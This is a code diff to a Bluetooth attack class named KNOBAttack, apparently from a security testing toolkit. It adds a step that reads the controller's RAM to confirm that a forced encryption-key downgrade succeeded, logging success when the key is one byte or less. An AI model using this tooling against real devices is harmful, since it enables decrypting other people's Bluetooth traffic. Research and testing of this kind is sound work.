@@ -395,6 +395,23 @@ class KNOBAttack:
                     result["darkfirmware_negotiation"] = "success"
                     result["lmp_responses"] = len(list(vsc.lmp_log_buffer))
 
+                # Verify via controller RAM (ground truth)
+                try:
+                    from blue_tap.core.firmware import ConnectionInspector
+                    inspector = ConnectionInspector()
+                    state = inspector.inspect_connection(vsc, 0)
+                    if state.get("active"):
+                        verified_ks = state.get("enc_key_size")
+                        result["verified_key_size"] = verified_ks
+                        result["verified_enc_enabled"] = state.get("enc_enabled")
+                        if verified_ks is not None:
+                            if verified_ks <= 1:
+                                success(f"[KNOB] CONFIRMED via RAM: controller reports {verified_ks}-byte key")
+                            else:
+                                info(f"[KNOB] RAM check: controller reports {verified_ks}-byte key")
+                except Exception as verify_exc:
+                    result["details"].append(f"RAM verification skipped: {verify_exc}")
+
         except Exception as exc:
             result["details"].append(f"DarkFirmware negotiation error: {exc}")
 
